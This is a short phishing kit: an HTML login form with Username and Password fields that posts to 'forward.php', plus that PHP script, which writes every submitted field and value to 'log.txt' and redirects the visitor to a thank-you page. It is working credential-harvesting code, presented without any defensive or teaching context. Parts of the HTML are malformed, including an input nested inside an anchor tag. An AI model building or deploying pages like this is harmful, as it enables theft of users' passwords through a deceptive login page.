


<form action=forward.php method="POST">
<div class="control-group"> <input class="login-field" value="user" placeholder="Username" id="login-name" autofocus="" type="text"> <label class="login-field-icon fui-user" for="login-name"></label> </div>
<div class="control-group">&nbsp; <label class="login-field-icon fui-lock" for="login-pass"></label><input class="login-field" value="pass" placeholder="Password" id="login-pass" type="password"> </div>
<a class="btn btn-primary btn-large btn-block" <input type="submit" value="Submit" href=forward.php >login</a> <a
class="login-link" href="#">Forgot your password?</a> </div>
forward.php 
<?php
header ('Location: /Regthank.php');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>